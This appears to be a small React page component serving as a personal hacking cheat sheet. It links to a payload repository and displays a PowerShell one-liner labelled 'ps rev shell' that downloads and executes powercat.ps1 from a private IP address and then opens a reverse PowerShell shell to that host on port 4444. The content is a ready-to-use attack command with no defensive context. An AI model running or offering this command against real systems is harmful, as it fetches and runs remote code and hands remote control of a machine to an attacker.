export default function ComamandsPage() {
  return (
    <div>
      <p>https://github.com/swisskyrepo/PayloadsAllTheThings</p>
      <pre>
        ps rev shell: powershell IEX (New-Object
        System.Net.Webclient).DownloadString('http://192.168.45.197/powercat.ps1');powercat
        -c 192.168.45.197 -p 4444 -e powershell
      </pre>
    </div>
  )
}
